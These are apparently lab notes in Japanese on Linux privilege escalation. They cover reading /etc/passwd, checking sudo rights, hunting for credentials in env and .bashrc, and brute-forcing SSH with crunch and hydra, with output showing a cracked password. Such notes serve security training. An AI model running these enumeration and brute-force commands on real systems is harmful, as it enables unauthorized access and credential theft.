# Current_User
```bash
id
```

```bash
cat /etc/passwd
# www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
# www-data = Web Svがインストールされている可能性
# sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
# sshd = SSH Svがインストールされている可能性
# joe:x:1000:1000:joe,,,:/home/joe:/bin/bash
# x パスワードハッシュ全体が /etc/shadowファイルに含まれている
# 1000 UID
# 1000 GID
# joe,,, Comment
# /bin/bash" - デフォルトの対話型シェル (存在する場合) 
```

# 権限の確認
```bash
sudo -l
User eve may run the following commands on debian-privesc:
    (ALL : ALL) ALL

sudo -i
```
# env
環境変数内に資格情報を保存する場合がある
```bash
# 環境変数調査
env
SCRIPT_CREDENTIALS="lab"
```

```bash
# 永続的な変数の調査
cat .bashrc
export SCRIPT_CREDENTIALS="lab"
```

### ホスト上の別のユーザへのブルートフォース
```bash
#wordlistの作成
crunch 6 6 -t Lab%%% > wordlist

#ブルートフォース
hydra -l eve -P wordlist 192.168.205.214 -t 4 ssh -V
[22][ssh] host: 192.168.205.214   login: eve   password: Lab123
```